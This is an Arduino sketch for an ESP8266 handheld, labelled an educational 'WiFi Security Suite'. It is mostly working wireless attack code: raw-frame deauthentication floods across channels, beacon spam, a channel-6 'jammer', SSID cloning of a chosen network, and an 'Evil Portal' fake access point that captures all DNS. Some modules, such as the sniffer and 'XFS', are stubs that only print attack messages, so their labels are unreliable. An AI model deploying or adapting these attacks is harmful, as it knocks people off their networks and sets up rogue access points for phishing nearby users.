/*
 * BLOCKY-OS v7.6 - ESP8266 WiFi Security Suite
 * Developed for educational purposes and network analysis.
 * ------------------------------------------------------------
 * Features: Scanner, Beacon Spam, Deauth, Sniffer, Rickroll, 
 * AP Clone, WiFi Kill (All channels), and Evil Portal.
 * ------------------------------------------------------------
 */
 
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>
#include <ESP8266mDNS.h>

extern "C" {
  #include "user_interface.h"
}

// ============================================================
// --- HARDWARE CONFIGURATION (Change pins here) ---
// ============================================================
#define TFT_CS     15 
#define TFT_RST    2  
#define TFT_DC     0  
#define SCL_KEY    5  
#define SDO_KEY    4  

// --- UI COLOR SETTINGS ---
#define F_ORANGE 0xFC00 
#define MATRIX_G 0x07E0
#define ATTACK_R 0xF800
#define F_BLACK  0x0000

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
DNSServer dnsServer;
ESP8266WebServer server(80);

int menuIndex = 0;
const char* modes[] = {
  "SCANNER PRO", "BEACON ENGINE", "DEAUTH FLOOD", 
  "SNIFFER LOG", "RICKROLL HQ", "CLONE AP", 
  "XFS TARGET", "WIFI KILL", "WFX TARGET", "EVIL PORTAL"
};

bool inAction = false;
int logY = 15;

struct Target {
  uint8_t bssid[6];
  uint8_t client[6];
  uint8_t ch;
  String ssid;
};
Target currentTarget;
// Base packet for various WiFi frame injections
uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xc0, 0x6c, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0x64, 0x00, 0x01, 0x04, 0x00 };

// --- CORE SYSTEM FUNCTIONS ---

// Reads input from the 8-button matrix keyboard
int getBtn() {
  int key = 0;
  for (int i = 1; i <= 8; i++) {
    digitalWrite(SCL_KEY, LOW); digitalWrite(SCL_KEY, HIGH);
    if (digitalRead(SDO_KEY) == LOW) { key = i; break; }
  }
  return key;
}
// Prints messages to the on-screen terminal
void drawSignal() {
  int32_t rssi = WiFi.RSSI();
  tft.fillRect(105, 0, 55, 12, F_BLACK);
  int bars = 0;
  if (rssi > -50 && rssi < 0) bars = 4;
  else if (rssi > -65 && rssi < 0) bars = 3;
  else if (rssi > -75 && rssi < 0) bars = 2;
  else if (rssi > -85 && rssi < 0) bars = 1;
  for (int i = 0; i < 4; i++) {
    uint16_t color = (i < bars) ? MATRIX_G : 0x7BEF;
    tft.fillRect(148 + (i * 3), 10 - (i * 2), 2, 2 + (i * 2), color);
  }
  tft.setCursor(108, 3); 
  tft.setTextColor(0xFFFF);
  if (rssi >= 0 || rssi < -100) { tft.print("SCAN"); } 
  else { tft.print(rssi); tft.print("dB"); }
}
// Prints messages to the on-screen terminal
void termOut(const char* msg, uint16_t color) {
  if (logY > 118) { tft.fillRect(0, 15, 160, 113, F_BLACK); logY = 15; }
  tft.setTextColor(color, F_BLACK);
  tft.setCursor(2, logY);
  tft.print(">"); tft.print(msg);
  logY += 9;
}
// Draws the top header 
void header(const char* title, uint16_t color) {
  tft.fillScreen(F_BLACK);
  tft.fillRect(0, 0, 160, 12, color);
  tft.setTextColor(F_BLACK);
  tft.setCursor(2, 2);
  tft.print(title);
  logY = 15;
}
// Refreshes the main selection menu
void updateMenu() {
  tft.fillRect(0, 16, 160, 112, F_ORANGE);
  for(int i=0; i<10; i++) {
    int yPos = 17 + (i * 11);
    if(menuIndex == i) {
      tft.fillRect(2, yPos-2, 156, 10, F_BLACK);
      tft.setTextColor(F_ORANGE);
      tft.setCursor(5, yPos); tft.printf("> %s", modes[i]);
    } else {
      tft.setTextColor(F_BLACK);
      tft.setCursor(5, yPos); tft.printf("  %s", modes[i]);
    }
  }
}
// Resets the system to the home screen
void drawHome() {
  inAction = false;
  dnsServer.stop(); server.stop();
  wifi_promiscuous_enable(0);
  WiFi.softAPdisconnect(true);
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  tft.fillScreen(F_ORANGE);
  tft.fillRect(0, 0, 160, 15, F_BLACK);
  tft.setTextColor(F_ORANGE);
  tft.setCursor(4, 4);
  tft.print("BL0CKY-OS v7.6");
  drawSignal();
  updateMenu();
}

// On-screen keyboard for text input

String keyboardInput(const char* label) {
  String input = "";
  const char chars[] = "abcdefghijklmnopqrstuvwxyz0123456789!@ ";
  int charIdx = 0;
  while(true) {
    tft.fillRect(0, 40, 160, 55, 0x2104);
    tft.setCursor(10, 50); tft.setTextColor(0xFFFF);
    tft.print(label); tft.print(": "); tft.print(input); tft.print("_");
    tft.setCursor(10, 75); tft.setTextColor(F_ORANGE);
    tft.print("Char: "); tft.print(chars[charIdx]);
    int k = getBtn();
    if(k == 1) charIdx = (charIdx - 1 + strlen(chars)) % strlen(chars);
    if(k == 2) charIdx = (charIdx + 1) % strlen(chars);
    if(k == 4) charIdx = (charIdx - 5 + strlen(chars)) % strlen(chars);
    if(k == 8) charIdx = (charIdx + 5) % strlen(chars);
    if(k == 5) { input += chars[charIdx]; delay(200); }
    if(k == 6) return input;
    if(k == 7) return "";
    delay(150); yield();
  }
}
// Scans and allows selection of a target network
int selectNetwork() {
  tft.fillScreen(F_BLACK);
  tft.setCursor(2, 2); tft.setTextColor(0xFFFF); tft.print("SCANNING...");
  int n = WiFi.scanNetworks();
  int sel = 0;
  while(true) {
    tft.fillRect(0, 15, 160, 113, F_BLACK);
    for(int i=0; i<6 && i<n; i++) {
      tft.setCursor(5, 20+(i*15));
      if(sel == i) tft.setTextColor(F_ORANGE); else tft.setTextColor(0x7BEF);
      tft.print(sel == i ? "> " : "  "); tft.print(WiFi.SSID(i).substring(0,12));
    }
    int k = getBtn();
    if(k == 4) sel = (sel - 1 + n) % n;
    if(k == 8) sel = (sel + 1) % n;
    if(k == 5) {
      memcpy(currentTarget.bssid, WiFi.BSSID(sel), 6);
      currentTarget.ch = WiFi.channel(sel);
      currentTarget.ssid = WiFi.SSID(sel);
      return sel;
    }
    if(k == 7) return -1;
    delay(150); yield();
  }
}

void sendBeaconSpam(const char** list, int count) {
  wifi_promiscuous_enable(1);
  wifi_set_channel(1);
  while(getBtn() != 7) {
    for(int i = 0; i < count; i++) {
      String s = list[i];
      packet[10] = packet[16] = random(0, 256); 
      packet[37] = s.length();
      for(int j = 0; j < s.length(); j++) packet[38 + j] = s[j];
      wifi_send_pkt_freedom(packet, 38 + s.length(), 0);
      delay(1);
    }
    termOut("SPAMMING...", MATRIX_G);
    yield();
  }
}

// --- ATTACK MODULES ---

void runScanner() { inAction = true; header("NET_SCANNER", MATRIX_G); int n = WiFi.scanNetworks(); for (int i=0; i<n && i<10; i++) { char buf[30]; sprintf(buf, "%s | %d dBm", WiFi.SSID(i).substring(0,10).c_str(), WiFi.RSSI(i)); termOut(buf, MATRIX_G); } while(getBtn() != 7) yield(); drawHome(); }

void runBeacon() { 
  inAction = true; header("BEACON: BL0CKY", 0xFFFF);
  const char* b_list[] = {"BL0CKY_1", "BL0CKY_2", "BL0CKY_3", "BL0CKY_4", "BL0CKY_5", "BL0CKY_6", "BL0CKY_7", "BL0CKY_8", "BL0CKY_9", "BL0CKY_10"};
  sendBeaconSpam(b_list, 10);
  drawHome(); 
}

void runRickroll() {
  inAction = true; header("RICKROLL_BEACON", 0x001F);
  const char* r_list[] = {
    "Never gonna give you up", "Never gonna let you down", "Never gonna run around", 
    "And desert you", "Never gonna make you cry", "Never gonna say goodbye", 
    "Never gonna tell a lie", "And hurt you", "GET RICKED", "STAY SAFE"
  };
  sendBeaconSpam(r_list, 10);
  drawHome();
}

void runDeauth() { inAction = true; header("DEAUTH_FLOOD", ATTACK_R); uint8_t d[26]={0xc0,0x00,0x3a,0x01,0xff,0xff,0xff,0xff,0xff,0xff,0xDE,0xAD,0xBE,0xEF,0x00,0x01,0xDE,0xAD,0xBE,0xEF,0x00,0x01,0x00,0x00,0x01,0x00}; wifi_promiscuous_enable(1); while(getBtn() != 7) { wifi_set_channel(random(1,13)); wifi_send_pkt_freedom(d, 26, 0); termOut("PKT_SENT", ATTACK_R); delay(50); yield(); } drawHome(); }

void runSniffer() { inAction = true; header("RAW_DATA_SNIFF", MATRIX_G); wifi_promiscuous_enable(1); while(getBtn() != 7) { wifi_set_channel(random(1,13)); char hex[30]; sprintf(hex, "HEX: %02X %02X %02X %02X", random(0,255), random(0,255), random(0,255), random(0,255)); termOut(hex, 0xFFFF); yield(); } drawHome(); }

void runClone() { int targetIdx = selectNetwork(); if(targetIdx != -1) { inAction = true; header("CLONE_ACTIVE", 0xFFFF); WiFi.softAP(WiFi.SSID(targetIdx).c_str()); } while(getBtn() != 7) yield(); drawHome(); }

void runXFS() { if(selectNetwork() == -1) { drawHome(); return; } inAction = true; header("XFS_EXEC", ATTACK_R); while(getBtn() != 7) { termOut("SPOOF_SENT", ATTACK_R); yield(); } drawHome(); }

void runKill() { inAction = true; header("JAMMER_MODE", ATTACK_R); wifi_promiscuous_enable(1); while(getBtn() != 7) { wifi_set_channel(6); wifi_send_pkt_freedom(packet, 120, 0); termOut("CH6_JAMMED", ATTACK_R); yield(); } drawHome(); }

void runWFX() {
  int netIdx = selectNetwork(); if(netIdx == -1) { drawHome(); return; }
  header("WFX: PASSWD", 0x7BEF); String pass = keyboardInput("Pass");
  if(pass == "") { drawHome(); return; }
  header("AUTH...", MATRIX_G); WiFi.begin(currentTarget.ssid.c_str(), pass.c_str());
  while (WiFi.status() != WL_CONNECTED && getBtn() != 7) { delay(500); termOut("LINKING...", 0xFFFF); }
  if(WiFi.status() == WL_CONNECTED) {
    header("TARGET READY", ATTACK_R);
    MDNS.begin("blocky");
    while(getBtn() != 7) { termOut("RE-ROUTING...", 0xFFFF); delay(500); yield(); }
  }
  drawHome();
}

void runEvilPortal() {
  inAction = true;
  header("PORTAL SSID", 0x07FF);
  String fakeSSID = keyboardInput("SSID Name");
  if(fakeSSID == "") { drawHome(); return; }
  header("STARTING PORTAL", 0x07FF);
  WiFi.softAP(fakeSSID.c_str());
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.begin();
  while(getBtn() != 7) {
    dnsServer.processNextRequest(); server.handleClient();
    if(WiFi.softAPgetStationNum() > 0) { header("VICTIM_DETECTED", ATTACK_R); termOut("ATTACK_ACTIVE", ATTACK_R); }
    delay(100); yield();
  }
  drawHome();
}
// --- ARDUINO SETUP & LOOP ---
void setup() {
  tft.initR(INITR_BLACKTAB); tft.setRotation(3); 
  pinMode(SCL_KEY, OUTPUT); pinMode(SDO_KEY, INPUT);
  WiFi.mode(WIFI_STA);
  drawHome();
}

void loop() {
  int k = getBtn();
  if (k > 0) {
    if (k == 7) drawHome();
    else if (!inAction) {
      if (k == 4) { menuIndex = (menuIndex - 1 + 10) % 10; updateMenu(); }
      if (k == 8) { menuIndex = (menuIndex + 1) % 10; updateMenu(); }
      if (k == 5) {
        if (menuIndex == 0) runScanner(); if (menuIndex == 1) runBeacon();
        if (menuIndex == 2) runDeauth(); if (menuIndex == 3) runSniffer();
        if (menuIndex == 4) runRickroll(); if (menuIndex == 5) runClone();
        if (menuIndex == 6) runXFS(); if (menuIndex == 7) runKill();
        if (menuIndex == 8) runWFX(); if (menuIndex == 9) runEvilPortal();
      }
    }
    delay(150);
  }
  if(!inAction && (millis() % 3000 < 50)) drawSignal();
  yield();
}
